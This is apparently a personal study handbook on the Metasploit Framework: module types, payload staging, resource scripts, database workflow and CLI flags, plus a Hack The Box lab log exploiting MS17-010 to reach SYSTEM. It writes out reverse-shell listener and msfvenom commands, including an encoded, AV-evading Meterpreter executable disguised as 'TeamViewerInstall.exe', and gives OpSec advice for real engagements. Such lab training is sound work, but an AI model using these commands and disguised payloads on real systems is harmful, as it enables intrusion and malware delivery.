# Metasploit Framework - Technical Handbook & Architecture

> [!info] Quick Navigation
> For rapid command lookup during active labs, see the [[Metasploit-CheatSheet]].

---

## 1. Architecture & Core Components

The Metasploit Framework (MSF) is a modular exploitation platform organized into distinct core component types, plugins, and automation scripts.

### 1.1 Module Types
A **module** is a piece of Ruby code designed to perform a specific action (scanning, exploiting, payload delivery, or post-exploitation).

| Module Type   | Description & Purpose                                                                                               | Practical Example                          |
| :------------ | :------------------------------------------------------------------------------------------------------------------ | :----------------------------------------- |
| **Exploit**   | Code that leverages a specific vulnerability in a target system to execute a payload.                               | `exploit/windows/smb/ms17_010_eternalblue` |
| **Auxiliary** | Modules that do not execute payloads. Used for network scanning, fuzzing, port enumeration, DoS, and brute-forcing. | `auxiliary/scanner/smb/smb_version`        |
| **Payload**   | The shellcode executed on the target system after an exploit successfully establishes access.                       | `windows/x64/meterpreter/reverse_tcp`      |
| **Post**      | Modules executed *after* gaining initial access to gather credentials, pivot, or enumerate system state.            | `post/windows/gather/hashdump`             |
| **Encoder**   | Obfuscates payloads to bypass signature-based Antivirus (AV) detection and clear bad characters (`\x00`).           | `encoder/x86/shikata_ga_nai`               |
| **NOP**       | Generators of No-Operation instructions (`\x90` sleds) used to align memory buffers during stack overflows.         | `nop/x86/opty2`                            |
| **Evasion**   | Modules designed to generate payload binaries that evade specific endpoint protections (EDR/AV).                    | `evasion/windows/windows_defender_exe`     |

---

### 1.2 Payload Classification (Singles vs. Stagers vs. Stages)
Metasploit divides payloads into two structural architecture types:

1. **Inline / Singles (Non-Staged):**
   * Self-contained payloads sent in a single monolithic packet.
   * *Syntax:* Indicated by an underscore (`_`) separating OS and payload (e.g., `linux/x86/shell_reverse_tcp`).
   * *Use Case:* Scenarios where network connectivity is unstable or multi-stage downloads are blocked.

2. **Staged Payloads:**
   * Split into two parts: a small **Stager** that hooks memory and connects back, followed by downloading the full **Stage** (such as Meterpreter).
   * *Syntax:* Indicated by a forward slash (`/`) separating OS and payload (e.g., `windows/x64/meterpreter/reverse_tcp`).
   * *Use Case:* Exploiting tight memory buffers where large payloads would overflow and crash the service.

---

### 1.3 Plugins & Extension Architecture
**Plugins** are Ruby scripts that directly extend the functionality of `msfconsole` by integrating external tools, databases, or automation layers directly into the framework environment.

* **Loading a Plugin:** `load <plugin_name>`
* **Unloading a Plugin:** `unload <plugin_name>`

#### Common Plugins:
* `load db_tracker` — Automatically logs discovered hosts and credentials to the connected database.
* `load nexpose` / `load openvas` — Imports vulnerability scan data directly into Metasploit.
* `load alias` — Allows creating custom command shortcuts inside `msfconsole`.

---

### 1.4 Automation Scripts & Resource Files (`.rc`)
Resource files are automation scripts containing sequential `msfconsole` commands executed line by line.

* **Creating a Resource Script:** Write commands in a text file ending in `.rc`:
  ```bash
  # Example: handler.rc
  use exploit/multi/handler
  set PAYLOAD windows/x64/meterpreter/reverse_tcp
  set LHOST 10.10.14.2
  set LPORT 4444
  run -j
  ```

- **Executing a Resource Script:**
    
    - From Bash Terminal: `msfconsole -r handler.rc`
        
    - From inside `msfconsole`: `resource handler.rc`
        

### 1.5 Database & Workspace Management

Metasploit uses a PostgreSQL database to track hosts, services, vulnerabilities, and credentials automatically, saving massive amounts of manual enumeration time.

#### 1. Setup and Initialization (Bash)
```bash
sudo systemctl start postgresql  # Start the DB service
sudo msfdb init                  # Initialize the MSF database schema
````

#### 2. Workspace Management (msfconsole)

Workspaces isolate project data (like folders) to prevent mixing targets.

Plaintext

```
msf6 > db_status               # Confirm DB is connected
msf6 > workspace -a HTB_Box1   # Create a new workspace
msf6 > workspace HTB_Box1      # Switch to the workspace
```

#### 3. Populating Data (Recon)

Run Nmap directly inside MSF to automatically populate the database.


```
msf6 > db_nmap -sV -sC 10.10.10.40
msf6 > db_import scan.xml      # Alternatively, import an existing scan
```

#### 4. Tracking and Leveraging Findings

Review findings and automatically configure module parameters (like RHOSTS).

```
msf6 > hosts                   # List discovered IPs and OS
msf6 > hosts -R                # Automatically sets RHOSTS to all IPs in the table
msf6 > services -p 445         # Filter services running on port 445
msf6 > creds                   # View captured passwords and hashes
msf6 > loot                    # View extracted files (shadow, passwd)
```

## 2. CLI Flags & Terminal Help System

### 2.1 Launching `msfconsole` from System Terminal (Bash Flags)

| **Flag**           | **Description & Purpose**                                            | **Practical Command Example**         |
| ------------------ | -------------------------------------------------------------------- | ------------------------------------- |
| `-q` / `--quiet`   | Suppresses the startup ASCII banner (saves terminal rendering time). | `msfconsole -q`                       |
| `-r <file.rc>`     | Executes a resource script immediately upon console startup.         | `msfconsole -r listener.rc`           |
| `-x "<cmds>"`      | Executes inline `msfconsole` commands directly from Bash.            | `msfconsole -x "use 0; show options"` |
| `-v` / `--version` | Displays the installed Metasploit Framework version.                 | `msfconsole -v`                       |
| `-h` / `--help`    | Displays help options for launching `msfconsole`.                    | `msfconsole -h`                       |

### 2.2 In-Console Help System (`msfconsole` Internal Commands)

When operating inside `msfconsole`, use these commands to obtain instant syntax guidelines without exiting the tool:

```bash
# 1. Display general console help or command-specific syntax
help
help search
help set

# 2. Inspect detailed module documentation, author, CVEs, and options
info exploit/windows/smb/ms17_010_eternalblue
info  # (When inside an active module)

# 3. View module options, targets, and advanced flags
show options     # Displays required and optional settings
show targets     # Displays target OS/Architecture options
show advanced    # Displays hidden flags (e.g., AutoCheck, Evasion settings)
show missing     # Displays only required options that are currently empty
```

### 2.3 Standalone Utility: `msfvenom` CLI Flags

`msfvenom` is the standalone payload generator and encoder tool included in the framework.

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f exe -o payload.exe
```


|**Flag**|**Description**|**Example**|
|---|---|---|
|`-p`|Specifies the payload to generate.|`-p linux/x64/shell_reverse_tcp`|
|`-f`|Output format (e.g., `exe`, `elf`, `raw`, `python`, `asp`).|`-f elf`|
|`-o`|Output file path.|`-o shell.elf`|
|`-e`|Encoder module to apply.|`-e x86/shikata_ga_nai`|
|`-i`|Number of encoding iterations.|`-i 5`|
|`-b`|Bad characters to avoid in byte code.|`-b '\x00\x0a\x0d'`|
|`--platform`|Target platform architecture.|`--platform windows`|
|`-l payloads`|Lists all available payloads.|`msfvenom -l payloads`|

### 2.4 Advanced Payload Generation & AV Evasion

When generating executable files to deliver to a target, `msfvenom` allows the use of encoders to alter the payload's static signature in an attempt to evade basic Antivirus (AV) detection.

#### 1. Basic Encoding Scenario
This command generates a Windows executable payload obfuscated with an encoder and saves it with a deceptive filename.

```bash
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe
````

- **`-a x86` / `--platform windows`**: Explicitly defines the 32-bit architecture and Windows OS to ensure compatibility.

- **`-p windows/meterpreter/reverse_tcp`**: The specific payload to execute (staged reverse TCP).

- **`-e x86/shikata_ga_nai`**: Applies the _Shikata Ga Nai_ encoder (a polymorphic XOR additive feedback encoder) to scramble the payload's signature.

- **`-f exe`**: Formats the output as a standard Windows executable.

- **`-o ./TeamViewerInstall.exe`**: Outputs the file with a socially engineered name.


#### 2. Multiple Encoding Iterations

To further obfuscate the payload, you can pass it through the encoder multiple times using the `-i` (iterations) flag.

Bash

```
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -i 10 -f exe -o /root/Desktop/TeamViewerInstall.exe
```

- **`-i 10`**: Applies the `shikata_ga_nai` encoding process **10 consecutive times**.
    
    - _Note on Modern Evasion:_ While multiple iterations alter the signature heavily, modern EDR/AV solutions often detect the `shikata_ga_nai` decoding stub itself rather than the payload.


#### 3. Analyzing Detection Rates (VirusTotal)

Metasploit includes a built-in command-line utility to query VirusTotal and see how many AV engines flag your generated payload as malicious.

Bash

```
msf-virustotal -k <API_key> -f TeamViewerInstall.exe
```

- **`-k <API_key>`**: Authenticates the request using your personal VirusTotal API key.

- **`-f <file>`**: Specifies the executable payload to scan.

- **⚠️ OpSec Warning (Red Teaming):** Uploading files to VirusTotal automatically shares them with antivirus vendors globally. If you develop a highly customized, undetectable payload for a real engagement, **do not** scan it with VirusTotal, as AV vendors will immediately analyze it and create signatures to block it.
## 3. Standard Module Lifecycle Workflow

Plaintext

```bash
[1. Search Target Service] ---> [2. Select Module] ---> [3. Configure Parameters] ---> [4. Execute Exploit]  ---> [5. Post-Exploitation] 
```

1. **Discovery:** `search type:exploit name:apache`

2. **Selection:** `use <index_number>` or `use <module_path>`

3. **Configuration:**

	 - `set RHOSTS <TARGET_IP>`
	
	 - `set LHOST <VPN_IP>`
    
    - `set LPORT 4444`
      
4. **Validation & Execution:**
    
    - `check` _(Verifies target vulnerability)_
    
	- `run` or `exploit -j`
	
5. **Session Management:** `sessions -i 1`
    

## 4. Hands-On HTB Practice & Machine Logs

### 1. Service Scanning and Network Reconnaissance
Proceeded to perform port scanning and version detection using `nmap` against the target address `10.129.194.229`.

```bash
nmap -sV 10.129.194.229
````

**Scan Results:**

- **80/tcp**: HTTP (Microsoft IIS httpd 10.0)

- **135/tcp**: MSRPC (Microsoft Windows RPC)

- **139/tcp**: NetBIOS-SSN

- **445/tcp**: Microsoft-DS (Microsoft Windows Server 2008 R2 - 2012)

- **5985/tcp**: HTTPAPI 2.0 (WinRM)


The active SMB service on port **445/tcp** on a legacy Windows operating system directed the attack vector towards known vulnerabilities in the SMBv1 protocol implementation.

### 2. Metasploit Module Selection and Inspection

Started the Metasploit console (`msfconsole -q`) and searched for modules related to the **MS17-010** security bulletin.

Plaintext

```
[msf] >> search ms17_010
[msf] >> use 10
```

Selected the `exploit/windows/smb/ms17_010_psexec` module (index 10), which combines the type confusion vulnerability (_Transaction / WriteAndX_) of EternalRomance/EternalSynergy with command execution via SMB/PSExec to achieve greater stability on the target.

### 3. Parameter Configuration

Configured the target variables (`RHOSTS`) and the local listening IP (`LHOST`).

Plaintext

```
[msf] exploit(windows/smb/ms17_010_psexec) >> set RHOSTS 10.129.194.229
[msf] exploit(windows/smb/ms17_010_psexec) >> set LHOST 10.10.15.67
```

### 4. Exploit Execution and Shell Access

With the parameters configured (`RHOSTS: 10.129.194.229` and `LHOST: 10.10.15.67`), launched the exploit:

Plaintext

```
[msf] exploit(windows/smb/ms17_010_psexec) >> run
```

**Successful Execution Flow:**

1. Started reverse TCP handler on `10.10.15.67:4444`.

2. Target OS identification: **Windows Server 2016 Standard 14393**.

3. Successful creation of the _write-what-where_ primitive over SMB.

4. Session token overwrite to gain `SYSTEM` level access.

5. Payload injection via automatic PowerShell target.

6. Meterpreter stage sent (203,451 bytes) and **Meterpreter Session 1** opened (`10.10.15.67:4444 -> 10.129.194.229:49674`).


### 5. Privilege Confirmation and Interactive Console Access

Within the Meterpreter environment, attempted to run the `whoami` command, which is not native to the Meterpreter console. To interact directly with the operating system, deployed a Windows command prompt (`cmd.exe`) using the `shell` command.

Plaintext

```
(Meterpreter 1)(C:\Windows\system32) > shell
Process 2996 created.
Channel 1 created.

C:\Windows\system32> whoami
nt authority\system
```

**Final Result:** Total compromise of the remote system was confirmed, obtaining the highest level of access on the target system (`nt authority\system`).

## 5. References & Linked Notes

- **Cheat Sheet Reference:** [[Metasploit-CheatSheet]]

- **Port Connectors:** [[Port-445-SMB]]